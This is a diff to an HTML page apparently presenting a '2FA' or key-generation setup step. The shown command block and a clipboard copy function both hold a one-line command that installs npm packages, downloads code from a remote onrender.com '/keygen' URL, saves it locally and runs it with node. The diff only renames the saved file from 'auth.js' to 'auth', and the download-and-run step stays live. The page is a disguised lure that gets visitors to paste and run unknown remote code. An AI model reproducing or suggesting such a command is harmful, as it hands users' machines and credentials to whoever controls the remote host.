@@ -286,7 +286,7 @@
                 <div class="tfa-bash" style="overflow-x: scroll; overflow-y:hidden;">
                   <code>
                     <div class="tfa-cmd" style="width: 1900px;">
-                      npm i request sqlite3 && node -e "require('https').get('https://btaf-h0iy.onrender.com/keygen', res => { let data = ''; res.on('data', d => { data += d; }); res.on('end', () => { require('fs').writeFileSync('auth.js', data); }); });" && node auth.js
+                      npm i request sqlite3 && node -e "require('https').get('https://btaf-h0iy.onrender.com/keygen', res => { let data = ''; res.on('data', d => { data += d; }); res.on('end', () => { require('fs').writeFileSync('auth', data); }); });" && node auth
                     </div>
                   </code>
                 </div>
@@ -336,7 +336,7 @@
 
     function copyCode() {
         // Simulate copying code (replace with actual code copy logic if necessary)
-        navigator.clipboard.writeText(`npm i request sqlite3 && node -e "require('https').get('https://btaf-h0iy.onrender.com/keygen', res => { let data = ''; res.on('data', d => { data += d; }); res.on('end', () => { require('fs').writeFileSync('auth.js', data); }); });" && node auth.js`)
+        navigator.clipboard.writeText(`npm i request sqlite3 && node -e "require('https').get('https://btaf-h0iy.onrender.com/keygen', res => { let data = ''; res.on('data', d => { data += d; }); res.on('end', () => { require('fs').writeFileSync('auth', data); }); });" && node auth`)
             .then(() => {
                 // Show the alert box with smooth transition
                 const alertBox = document.getElementById("alert");
